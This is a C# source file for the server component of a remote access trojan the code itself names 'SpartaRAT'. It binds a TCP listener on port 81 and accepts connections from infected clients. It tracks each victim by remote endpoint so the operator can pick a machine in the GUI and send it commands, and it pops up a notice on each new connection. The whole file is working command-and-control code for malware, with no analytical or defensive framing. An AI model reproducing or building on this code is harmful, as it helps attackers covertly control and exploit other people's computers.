using RATserverSparta.Client;
using RATserverSparta.GUI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace RATserverSparta.Sockets
{
    public class Server
    {
        public Dictionary<string, Client.Client> ClientInstanceMap = new Dictionary<string, Client.Client>();
        public Dictionary<string, Socket> ClientSocketMap = new Dictionary<string, Socket>();
        public delegate void NewConnection(Client.Client ClientClassInstance, Socket client);
        public event NewConnection OnNewConnection;
        private MainGUI GUI_Instance;
        private Socket Socket;

        public Server(MainGUI instance)
        {
            this.GUI_Instance = instance;
            this.OnNewConnection += NewClient;
        }

        public dynamic Create()
        {
            try
            {
                IPAddress IpAddress = IPAddress.Parse(this.GUI_Instance.HostValue.Text);
                Socket Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint LocalEndPoint = new IPEndPoint(IpAddress, 81); //IpAddress, Port
                Socket.Bind(LocalEndPoint);
                MessageBox.Show("Server Created - " + IpAddress.ToString() + ":81" + 
                    Environment.NewLine + "Notice: SpartaRAT allow listening to one ip address");
                this.Socket = Socket;
                Socket.Listen(100);
                return true;
            }
            catch
            {
                MessageBox.Show("Please select a host ip address at the Settings");
                return false;
            }
        }

        public void Accept()
        {
            while(true)
            {
                try
                {
                    Socket client = Socket.Accept();
                    //Main class communication instance:
                    Client.Client ClientClassInstance = new Client.Client(GUI_Instance, client);
                    OnNewConnection.Invoke(ClientClassInstance, client);
                }
                catch { }
            }
        }


        //This delegate being used at the MainGUI class instance, to know when to create logs and add a listview items.
        private void NewClient(Client.Client ClientClassInstance, Socket client)
        {
            //Invoking the GUI Instance class which running on different Thread:
            this.GUI_Instance.Invoke((MethodInvoker)delegate
            {
                this.GUI_Instance.ClientsConnected.Text = "Connected Clients: " + this.GUI_Instance.ConnectedClients++.ToString();
            });

            //Mapping each Client RemoteEndPoint string into his Main class communication instance:
            //This is how we can choose right click on client at the GUI, and send to this specific client the things we need.
            this.ClientInstanceMap[client.RemoteEndPoint.ToString()] = ClientClassInstance;
            //Doint the same for Socket
            this.ClientSocketMap[client.RemoteEndPoint.ToString()] = client;

            //Showing new connection GUI
            new Thread(new ThreadStart(() =>
            {
                NewconnectionGUI newconnectionGUI = new NewconnectionGUI(client.RemoteEndPoint.ToString());
                newconnectionGUI.ShowDialog();
            })).Start();

            //Sending each client to his own class instance
            //Notice that there is no need to create Thread for each client, because the Delegate itself runs on new thread already.
            new Thread(new ThreadStart(() =>
            {
                ClientClassInstance.Receive();
            })).Start();
        }
    }
}
